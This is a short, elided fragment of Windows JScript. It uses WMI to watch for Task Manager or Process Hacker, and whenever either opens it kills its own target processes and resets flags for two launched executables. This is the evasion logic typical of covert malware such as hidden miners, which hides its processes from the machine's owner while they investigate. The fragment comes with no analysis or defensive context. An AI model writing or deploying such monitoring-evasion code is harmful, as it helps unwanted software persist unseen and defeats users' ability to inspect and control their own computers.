...
function isAnyProcessRunning(names) {
    for (var i = 0; i < names.length; i++) {
        var processes = new Enumerator(WMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name='" + names[i] + "'"));
        if (!processes.atEnd()) {
            return true;
        }
    }
...
while (true) {
    try {
        if (isAnyProcessRunning(["Taskmgr.exe", "ProcessHacker.exe"])) {
            killTargetProcesses();
            exe1Started = false;
            exe2Started = false;
            startTime = null;
